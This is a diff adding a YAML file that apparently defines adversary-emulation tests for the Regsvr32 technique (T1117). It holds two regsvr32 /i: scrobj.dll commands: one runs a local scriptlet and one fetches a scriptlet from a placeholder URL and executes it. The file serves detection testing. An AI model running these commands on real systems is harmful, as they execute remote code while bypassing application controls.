@@ -1,0 +1,30 @@
+attack_technique: T1117
+display_name: Regsvr32
+
+atomic_tests:
+- name: Regsvr32 Local Execution
+  description: |
+    Regsvr32.exe is used to register and unregister OLE controls
+
+  supported_platforms:
+    - windows
+
+  args:
+    file_name:
+      default: example.sct
+  executor:
+  - name: command_prompt
+    command: regsvr32.exe /s /u /i:#{file_name} scrobj.dll
+- name: Regsvr32 Remote Execution
+  description: |
+    Regsvr32.exe is used to register and unregister OLE controls
+
+  supported_platforms:
+    - windows
+
+  args:
+    file_name:
+      default: https://www.example.com
+  executor:
+  - name: command_prompt
+    command: regsvr32.exe /s /u /i:#{file_name} scrobj.dll
